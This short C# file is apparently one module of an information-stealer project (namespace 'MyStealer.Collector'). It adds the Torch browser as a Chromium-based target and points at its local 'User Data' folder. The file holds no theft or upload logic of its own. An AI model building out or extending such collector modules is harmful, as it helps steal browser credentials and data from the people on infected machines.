using System.IO;
using System;

namespace MyStealer.Collector.Browser.ChromiumBased
{
    public class Torch : Chromium
    {
        public override string ModuleName => "Torch";

        public override bool HasProfiles => false;

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Torch", "User Data");
    }
}
